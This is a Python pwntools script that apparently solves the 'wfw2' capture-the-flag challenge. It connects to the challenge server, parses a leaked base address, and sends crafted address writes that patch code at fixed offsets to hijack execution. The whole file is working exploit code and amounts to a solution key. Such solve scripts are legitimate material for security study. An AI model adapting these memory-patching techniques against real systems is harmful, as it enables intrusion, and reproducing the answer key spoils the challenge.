from pwn import *

context.log_level = 'DEBUG'
context.binary = ELF('./chal')

"""
print(disasm(b'CT')) # 43 54                   rex.XB push r12
print(disasm(b'C'))  # 43                      rex.XB
print(disasm(b'T'))  # 54                      push   rsp
print(disasm(b'F'))  # 46                      rex.RX
print(disasm(b'{'))  # 7b                      .byte 0x7b
"""

p = remote('wfw2.2023.ctfcompetition.com', '1337')

p.recvuntil(b"It's the challenge from before, but I've removed all the fluff\n")
base_addr = int(p.recvuntil(b'\n').decode().split('-')[0], 16)
p.recvuntil(b'\n\n')

def nop(addr):
	p.sendline(b'0x%x 2' %addr)
	sleep(0.5)

nop(base_addr+0x1443)
nop(base_addr+0x1442)
nop(base_addr+0x1441)
nop(base_addr+0x1440)
p.sendline(b'0x%x 70' %(base_addr+0x20d5))
sleep(0.5)
p.sendline()

p.interactive()